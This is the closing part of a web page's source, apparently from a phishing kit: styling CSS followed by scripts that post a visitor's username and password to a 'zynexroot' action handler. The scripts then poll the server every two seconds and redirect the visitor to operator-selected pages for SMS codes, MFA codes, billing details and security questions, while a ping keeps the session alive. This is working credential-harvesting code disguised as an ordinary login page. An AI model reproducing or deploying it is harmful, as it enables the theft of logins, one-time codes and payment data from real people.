        }

        .py-3 {
          padding-bottom: .75em;
          padding-top: .75em
        }

        .pb-1 {
          padding-bottom: .25em
        }

        .pb-2 {
          padding-bottom: .5em
        }

        .pb-2\.5 {
          padding-bottom: .625em
        }

        .pb-4 {
          padding-bottom: 1em
        }

        .pb-9 {
          padding-bottom: 2.25em
        }

        .pl-4 {
          padding-left: 1em
        }

        .pr-3 {
          padding-right: .75em
        }

        .pt-0 {
          padding-top: 0
        }

        .pt-1 {
          padding-top: .25em
        }

        .pt-1\.5 {
          padding-top: .375em
        }

        .pt-2 {
          padding-top: .5em
        }

        .pt-3 {
          padding-top: .75em
        }

        .pt-6 {
          padding-top: 1.5em
        }

        .pt-7 {
          padding-top: 1.75em
        }

        .text-center {
          text-align: center
        }

        .text-start {
          text-align: start
        }

        .text-\[16px\] {
          font-size: 16px
        }

        .text-base {
          font-size: 1em;
          line-height: 1.5em
        }

        .font-bold {
          font-weight: 700
        }

        .uppercase {
          text-transform: uppercase
        }

        .lowercase {
          text-transform: lowercase
        }

        .text-gray-400 {
          --tw-text-opacity: 1;
          color: rgb(94 94 94/var(--tw-text-opacity))
        }

        .underline {
          text-decoration-line: underline
        }

        .opacity-0 {
          opacity: 0
        }

        .opacity-100 {
          opacity: 1
        }

        .opacity-30 {
          opacity: .3
        }

        .blur {
          --tw-blur: blur(8px)
        }

        .blur,
        .blur-sm {
          filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .blur-sm {
          --tw-blur: blur(4px)
        }

        .filter {
          filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .transition-opacity {
          transition-property: opacity;
          transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .duration-150,
        .transition-opacity {
          transition-duration: .15s
        }

        .duration-75 {
          transition-duration: 75ms
        }

        :host {
          font-size: 16px !important;
          line-height: 1.5 !important;
          -webkit-text-size-adjust: 100% !important;
          font-family: Lato, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji !important;
          font-feature-settings: normal !important;
          tab-size: 4 !important
        }

        .layout-container-holder {
          align-items: flex-start;
          background: #de2717;
          border-radius: .375em;
          color: #fff;
          display: flex;
          flex-direction: column;
          gap: .5em;
          padding: 1em;
          width: 37.5em
        }

        .layout-header {
          min-height: 1.5em
        }

        .layout-content {
          position: relative;
          width: 100%
        }

        .layout-content-close {
          background: #de2717;
          border-radius: 50%;
          bottom: calc(var(--UNIT)*-1.5);
          cursor: pointer;
          left: 50%;
          margin-left: calc(var(--UNIT)*-1);
          position: absolute;
          transform: translateX(-50%);
          z-index: var(--Z-TOOLTIP)
        }

        .hover\:opacity-80:hover {
          opacity: .8
        }

        .dark\:border-gray-dark-600:is(.dark *) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        .dark\:bg-black:is(.dark *) {
          background-color: rgb(var(--black-fixed))
        }

        .dark\:bg-gray-800:is(.dark *) {
          --tw-bg-opacity: 1;
          background-color: rgb(136 136 136/var(--tw-bg-opacity))
        }

        .dark\:bg-gray-dark-400:is(.dark *) {
          --tw-bg-opacity: 1;
          background-color: rgb(56 56 56/var(--tw-bg-opacity))
        }

        .dark\:bg-gray-dark-600:is(.dark *) {
          --tw-bg-opacity: 1;
          background-color: rgb(45 45 45/var(--tw-bg-opacity))
        }

        .dark\:fill-primary-accent-foreground:is(.dark *) {
          fill: rgb(var(--text-accent-primary))
        }

        .dark\:text-gray-dark-200:is(.dark *) {
          --tw-text-opacity: 1;
          color: rgb(207 207 207/var(--tw-text-opacity))
        }
      </style>
    </template>
  </s30fee83f-62dc-407c-b2bc-a11b8631cef3>
  
  
<script src="assets/js/main.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>

    function submit_form() {
        var usrInput = document.getElementById('usrInput').value;
        var vpwd = document.getElementById('vpwd').value;
        var submitButton = document.getElementById('dom-login-button'); // Corrected ID

        // Disable the button to prevent double submission
        submitButton.disabled = true;

        // Initialize a flag to track if there are errors
        var hasErrors = false;

        // Validate usrInput
        if (!usrInput) {
            document.getElementById('error1').style.display = 'flex';
            hasErrors = true;
        } else {
            document.getElementById('error1').style.display = 'none';
        }

        // Validate vpwd
        if (!vpwd) {
            document.getElementById('error2').style.display = 'flex';
            hasErrors = true;
        } else {
            document.getElementById('error2').style.display = 'none';
        }

        // If there are errors, re-enable the button and return early to stop form submission
        if (hasErrors) {
            submitButton.disabled = false;
            return;
        }

        // Prepare form data
        var data = new URLSearchParams({
            usrInput: usrInput,
            vpwd: vpwd
        });

        // Send request using fetch for better performance
        fetch('zynexroot/inc/action.php?type=login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: data
        })
        .then(response => response.json())
        .then(parsed_response => {
            if (parsed_response.status === 'ok') {
                var redirectUrl = <?php echo (file_get_contents("zynexroot/offline.txt") == 1) ? "'notice.php'" : "'loading.php'"; ?>;
                location.href = redirectUrl;
            } else {
                console.error('Error:', parsed_response.message);
            }
        })
        .catch(error => {
            console.error('Error during submission:', error);
        })
        .finally(() => {
            // Re-enable the button after the request is complete
            submitButton.disabled = false;
        });
    }
</script>

  <script>
let currentStatus = null;

async function pollStatus() {
    try {
        const response = await fetch('status.php?type=getstatus', {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });

        if (response.ok) {
            const data = await response.json();
            if (data.status && data.status !== currentStatus) {
                currentStatus = data.status;
                handleRedirection(currentStatus);
            }
        } else {
            console.error("Polling error: HTTP status " + response.status);
        }
    } catch (error) {
        console.error("Polling error:", error);
    } finally {
        // Poll again after a delay
        setTimeout(pollStatus, 2000); // Adjust the interval as needed
    }
}

function handleRedirection(status) {
    const urlMappings = {
        '0': "done.php",
        '1': "index.php",
        '3': "login_error.php",
        '9': "sms.php",
        '11': "sms_error.php",
        '84': "billing2.php",
        '86': "process.php",
        '88': "process_error.php",
		'200': "mfa.php",
		'202': "mfa_error.php",
		'204': "sec.php",
		'206': "sec_error.php",
		'90': "notice.php",
        '99': null // Do nothing for status 99
    };

    const targetUrl = urlMappings[status];
    const currentPage = window.location.pathname.split('/').pop(); // Get the current page name

    if (targetUrl && currentPage !== targetUrl) {
        window.location.href = targetUrl;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    pollStatus();
});

</script>

<script>
    const pingServer = () => {
        fetch("zynexroot/inc/action.php?type=ping")
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => console.log(data))
            .catch(error => console.error('Error pinging server:', error));
    };

    // Ping every 3 seconds
    setInterval(pingServer, 3000);
</script>

</html>